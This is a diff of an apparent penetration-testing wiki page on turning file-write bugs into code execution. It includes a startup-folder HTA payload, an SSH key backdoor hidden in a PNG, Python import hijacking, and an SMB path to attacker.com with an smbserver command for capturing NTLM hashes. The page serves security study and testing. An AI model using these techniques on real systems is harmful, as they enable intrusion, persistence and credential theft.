@@ -12,9 +12,9 @@ Using techniques similar to [local-file-disclosure.md](local-file-disclosure.md 
 * `/root` likely won't work if you are not the `root` user, and may result in "Permission denied"
 * `/nonexistant` or any random name may give an error saying the directory wasn't found
 
-Then, depending on the system, you need to decide what file to create or overwrite. Many ways exist to obtain Remote Code Execution but there often isn't one silver bullet that always works, so this requires some experimenting and knowledge of the server's backend.&#x20;
+Then, depending on the system, you need to decide what file to create or overwrite. Many ways exist to obtain Remote Code Execution but there often isn't one silver bullet that always works, so this requires some experimenting and knowledge of the server's backend.
 
-This page collects some known ways to achieve RCE or other privileged access on the server. When a method does not require completely controlling the full content of the file, it is considered a '_dirty_'  write because random data may come before or after it.&#x20;
+This page collects some known ways to achieve RCE or other privileged access on the server. When a method does not require completely controlling the full content of the file, it is considered a 'partial'  write because random data may come before or after it. These are **even more powerful**.
 
 ## Overwriting Code
 
@@ -28,7 +28,7 @@ Writing source code can go in multiple ways. If the directory where you are writ
 **Note**: Even if you overwrite source code, it might not be directly executed when you visit the page because it is compiled and won't be reloaded until the server is restarted. You may be able to trigger this by crashing the server, or just be patient until this happens naturally.
 {% endhint %}
 
-#### PHP (`.php`, `.php7`, `.phtml`, `.phar`, etc.) - dirty
+#### PHP (`.php`, `.php7`, `.phtml`, `.phar`, etc.) - partial
 
 {% code title="shell.php" %}
 ```php
@@ -65,6 +65,8 @@ You can also create a compiled `.pyc` file which can be executed just like any o
 python3 -c '__import__("py_compile").compile("shell.py", "shell.pyc")'
 ```
 
+In case you can't _ove&#x72;_&#x77;rite a file, you may still be able to write next to it. If you are able to restart the application or trigger dynamic imports, you can hijack an `import` statement by naming it the same, such as `json.py` ([example](https://siunam321.github.io/ctf/NahamCon-CTF-2025/Web/Talk-Tuah/#afw-to-rce-via-hijacking-python-importing-module)). The same can be done with .py and .so files as they are also recognized ways of importing a library in Python ([source](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/)).
+
 #### JavaScript (`.js`, `.mjs`)
 
 {% code title="shell.js" %}
@@ -73,7 +75,7 @@ require("child_process").execSync("id > /tmp/pwned").toString()
 ```
 {% endcode %}
 
-#### C# ASP.NET (`.asp`, `.aspx`) - dirty
+#### C# ASP.NET (`.asp`, `.aspx`) - partial
 
 {% code title="shell.asp" %}
 ```aspnet
@@ -165,7 +167,7 @@ End Sub
 
 Not only user-created code can be overwritten, sometimes a program does not reload its source code while running. For those situations, another trick that may work is to overwrite libraries that are loaded. If you have permissions to overwrite a Python `.py` file inside the packages folder, or can overwrite a JAR file for Java applications, it could grant code execution again.
 
-Specific to Python, one trick [shared in this article](https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/) involves a `.pth` file stored in `~/.local/lib/pythonX.Y/site-packages`. These files are automatically parsed when starting a new Python process to load the package paths, but has one interesting behaviour that we can exploit:
+Specific to Python, one trick [shared in this article](https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/) involves a `.pth` file stored in `~/.local/lib/pythonX.Y/site-packages`. These files are automatically parsed when starting a new Python process to load the package paths, but has one interesting behavior that we can exploit:
 
 ```python
 ...
@@ -185,7 +187,7 @@ ANYTHING
 
 The above will execute when the correct Python version is launched even when the "ANYTHING" part is invalid syntax, it only needs to be valid UTF-8.
 
-### Templates (dirty)
+### Templates (partial)
 
 If source code is not writable or isn't reloaded, another simple method is overwriting templates that can execute code. There are many different templating engines that all use their own syntax and context, some more restricted than others. But most of them have ways to execute arbitrary code or at least read some secrets. Read the full Server-Side Template Injection page to see if your case fits:
 
@@ -239,8 +241,6 @@ With ASLR, the offset of memory addresses is random on modern systems. But if yo
 
 In here, we can find the address where `libc` is loaded. A common attack now is to download the libc of the remote target with a file read vulnerability (or guess it), then overwrite some commonly used function's instructions with our shellcode.
 
-
-
 {% embed url="https://brycec.me/posts/dicectf_2022_writeups#denoblog" %}
 denoblog writeup explaining deno sandbox bypass using /proc/self/mem
 {% endembed %}
@@ -249,7 +249,7 @@ denoblog writeup explaining deno sandbox bypass using /proc/self/mem
 
 If you cannot directly write or execute source code, the configuration of an application or server can often also have large exploitable areas. You may be able to set shell commands directly in here, or change the configuration in some way to aid another method.
 
-### `.ssh/authorized_keys` (dirty)
+### `.ssh/authorized_keys` (partial)
 
 When SSH is set up on a server, every shell user can have an `.ssh/` directory inside their home directory containing their public and private key, as well as an `authorized_keys` file that contains all the **public keys** allowed to log in as this user, **separated by newlines**.&#x20;
 
@@ -273,7 +273,7 @@ Default installations of SSH don't allow logging in as `root`. To check this loo
 </code></pre>
 {% endhint %}
 
-SSH only splits this file by `\n` newline characters and parse all sections as possible public keys. That means a dirty write where random data is before and/or after our payload is possible to exploit by adding newlines before and after our public key. Create a valid PNG that is also a backdoored `authorized_keys` file, for example:
+SSH only splits this file by `\n` newline characters and parse all sections as possible public keys. That means a partial write where random data is before and/or after our payload is possible to exploit by adding newlines before and after our public key. Create a valid PNG that is also a backdoored `authorized_keys` file, for example:
 
 ```bash
 exiftool -Comment=$'\nssh-rsa AAAA...wzE=\n' example.png
@@ -283,7 +283,7 @@ If the image is transformed in some way, metadata comments like these may not su
 
 ### Apache `.htaccess`
 
-When uploading files, rules are often set on the upload directory to prevent `.php` files from executing, or these extensions are simply blocked by a filter. In such cases, a file named `.htaccess` could configure an Apache server to change the behaviour of a directory.&#x20;
+When uploading files, rules are often set on the upload directory to prevent `.php` files from executing, or these extensions are simply blocked by a filter. In such cases, a file named `.htaccess` could configure an Apache server to change the behavior of a directory.&#x20;
 
 The main idea is to add another file extension that you _are_ allowed to upload to be able to execute PHP code, and you can even specify an encoding like UTF-7 to bypass filters. See the following writeup for an example of exploiting this from start to finish:
 
@@ -310,7 +310,7 @@ The repository below shows some more techniques using `.htaccess` file to get RC
 Repository containing various tricks to get RCE using .htaccess files alone
 {% endembed %}
 
-### uWSGI magic variables (dirty)
+### uWSGI magic variables (partial)
 
 {% embed url="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html" %}
 Overwriting `uwsgi.ini` files containing syntax to execute shell commands
@@ -389,7 +389,7 @@ There are multiple places for such files, but often these are only writable by t
 * `/var/spool/cron/crontabs/$USER`: File per user with cron syntax, often edited manually with `crontab -e`. The filename is the username it executes as.
 * `/etc/cron.hourly`, `.daily`, etc.: Bash scripts that cron will also execute every hour, day, week or month. These may be dirty too as they are only bash scripts and don't require special syntax.
 
-### Bash Profile (dirty)
+### Bash Profile (partial)
 
 Another way is creating a **backdoor** in the user's home directory. For Bash, the `~/.bashrc` file is most common as it executes in any non-login interactive shell. However, for login shells like SSH, a few more are executed in the following order. The _first_ readable file is the _only_ one that executes:
 
@@ -490,3 +490,101 @@ class Gadget
 x|O:6:"Gadget":1:{s:7:"command";s:15:"id > /tmp/pwned";}
 ```
 {% endcode %}
+
+## Windows
+
+In the above chapters I talked about Linux a lot, because it's the most common for servers. But you may find a file write vulnerability in a client-side application. In that case Windows is still the most popular, so a good exploit should work on there.
+
+Firstly, keep in mind that Windows handles paths differently than Linux. For one, **forward- and backslashes can be used interchangeably** potentially allowing some filter bypasses.\
+If you're targeting a filename with a random suffix, you can also make use of **8.3 filenames**:
+
+{% embed url="https://tomgalvin.uk/blog/gen/2015/06/09/filenames/" %}
+Exploration of 8.3 filenames and their edge cases
+{% endembed %}
+
+Use the `dir /x` command to view these shortened filenames in a directory, for example:
+
+<pre class="language-powershell"><code class="lang-powershell">C:\Windows\Tasks> echo test > some-super-long-filename.txt
+C:\Windows\Tasks> dir /x
+...
+<strong>00-00-2025  00:00                 8 SOME-S~1.TXT some-super-long-filename.txt
+</strong>C:\Windows\Tasks> type SOME-S~1.TXT
+test
+</code></pre>
+
+There's also a bunch of rules for path normalization, especially when looking at different drives. Check out the article below to get an idea:
+
+{% embed url="https://www.fileside.app/blog/2023-03-17_windows-file-paths/" %}
+Exploring many formats for paths on Windows
+{% endembed %}
+
+### Startup Folder with HTA (partial)
+
+One easy place to write a payload that will be executed in the future is the user's startup folder. Every file in here will be opened with the default program when the system starts up. You can quickly navigate to it by pressing Win+R and inputting `shell:startup`. This should bring you to a path like the following:
+
+```
+C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+Putting an `.exe` here, for example, will run it once you shut down and start up the system again.
+
+This can be useful for a partial file write using the HTA ([HTML Application](https://en.wikipedia.org/wiki/HTML_Application)) file format. This very flexible format is based on HTML, which means it doesn't error out on strange content. All it looks for is `<script>` tags to execute as [VBScript](https://en.wikipedia.org/wiki/VBScript), to run local system commands.
+
+<pre class="language-html" data-title="payload.hta"><code class="lang-html">&#x3C;script language="VBScript">
+  Set shell = CreateObject("wscript.Shell")
+<strong>  shell.run "calc"
+</strong>  Window.Close
+&#x3C;/script>
+</code></pre>
+
+The above executes `calc`, but can be replaced with any other malicious payload. See my writeup below for how I used this in an application that generates a BMP image from specifically crafted pixels to form the above payload into the startup folder:
+
+{% embed url="https://jorianwoltjer.com/blog/p/research/obs-websocket-rce" %}
+Embedding HTA in the pixels of a BMP image on Windows
+{% endembed %}
+
+### Leaking Username
+
+You'll often be attacking a specific _user_ on Windows, as opposed to a "root" user who can do anything. By default, you can only write to your personal folder under `C:\Users\[username]`, and a few globally writable directories outside of that such as `C:\Windows\Temp` or `C:\Windows\Tasks`.
+
+That means for most impactful file writes, you'll need to know the username of the victim to prepare a path that points to their permitted folder. There are a few edge cases where you may not need to fill out the complete username:
+
+* Try **relative paths**, if it starts out in the user's home directory already, you may be able to use a limited set of `../` sequences to perfectly go to the folder you want.
+* Check if **environment variables** are resolved. In that case, things like `%USERPROFILE%` point to the current user's home directory.
+
+When you do really need to get the username for an absolute path, there may be other vulnerable functionality in the app that allows you to leak such a username beforehand. Maybe some templating feature where you can extract it from another path that happens to contain it, or something leaking the victim's name that can help guess the path. Get creative.\
+Keep in mind that you may be able to brute force the username depending on your vulnerability. If you can rapidly do attempts just go through a wordlist of common names, because Windows will shorten it often to just the person's first name.
+
+As a last option, it could be possible to use an **SMB path** to connect to a remote attacker's server. For authentication purposes, this sends your username to the attacker's server who can then read it, and prepare a working absolute path.\
+This is similar to [#forcing-authentication-to-relay](../../windows/exploitation.md#forcing-authentication-to-relay "mention"), because in an active Active Directory environment, such an authentication alone can be enough to take over someone's account by relaying it to another service.\
+The path should look something like this:
+
+{% code title="Paths" %}
+```
+\\attacker.com\share\file.txt
+
+smb://attacker.com/share/file.txt
+```
+{% endcode %}
+
+An attack can host their server on `attacker.com` with the following command ([`smbserver.py`](https://github.com/fortra/impacket/blob/master/impacket/smbserver.py)):
+
+{% code title="Setup server" %}
+```sh
+cd $(mktemp -d)
+sudo smbserver.py -smb2support -ip 0.0.0.0 share .
+```
+{% endcode %}
+
+If successful, you can expect terminal output like this:
+
+```powershell
+[*] Incoming connection (10.10.10.10,54321)
+[*] AUTHENTICATE_MESSAGE (WORKGROUP\LAPTOP$,LAPTOP)
+[*] User LAPTOP\User authenticated successfully
+[*] LAPTOP$::User:aaaaaaaaaaaaaaaa:000102030405060708090a0b0c0d0e0f:f9f8f7f6f5f4f3f2f1f0efeeedecebeae9e8e7e6e5e4e3e2e1e0dfdedddcdbdad9d8d7d6d5d4d3d2d1d0cfcecdcccbcac9c8c7c6c5c4c3c2c1c0bfbebdbcbbbab9b8b7b6b5b4b3b2b1b0afaeadacabaaa9a8a7a6a5a4a3a2a1a09f9e9d9c9b9a999897969594939291908f8e8d8c8b8a898887868584838281807f7e7d7c7b7a797877767574737271706f6e6d6c6b6a696867666564636261605f5e5d5c5b5a595857565554535251504f4e4d4c4b4a494847464544434241403f3e3d3c3b3a393837363534333231302f2e2d2c2b2a292827262524232221201f1e1d1c1b1a191817161514131211100f0e0d0c0b0a09080706050403020100
+```
+
+{% hint style="info" %}
+**Note**: This might not word directly, because of Firewalls often denying outbound SMB connections. You can try to simulate it being on the same local Wi-Fi network which could still be a valid attack vector.
+{% endhint %}
